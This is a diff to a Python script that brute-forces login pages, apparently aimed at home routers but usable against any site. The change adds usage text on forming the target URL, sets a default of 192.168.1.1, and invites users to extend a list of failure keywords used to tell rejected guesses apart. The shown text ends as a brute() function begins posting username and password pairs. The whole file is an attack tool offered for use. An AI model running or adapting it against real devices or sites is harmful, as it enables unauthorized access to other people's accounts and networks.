@@ -1,12 +1,21 @@
 import requests
 import sys
 
-url = input("Router's ip (format: http/https://<url>:<port>/<login-file> (the port is optional if it is 80) (default: http://192.168.1.1): ") # Be sure about the router ip
+usage = input("Show URL usage? y/n: ")
+if usage.lower() == "y":
+    print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
+    print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
+    print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
+    print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
+else:
+    pass
+
+url = input("Router's ip (default: http://192.168.1.1): ") # Be sure about the router ip
 
 if not url:
     url = 'http://192.168.1.1'
 
-expression = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}
+expression = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"} #you can add your own login page errors messages here
 
 def brute(username, password, combinations_tested, total_combinations):
     data = {'username': username, 'password': password}
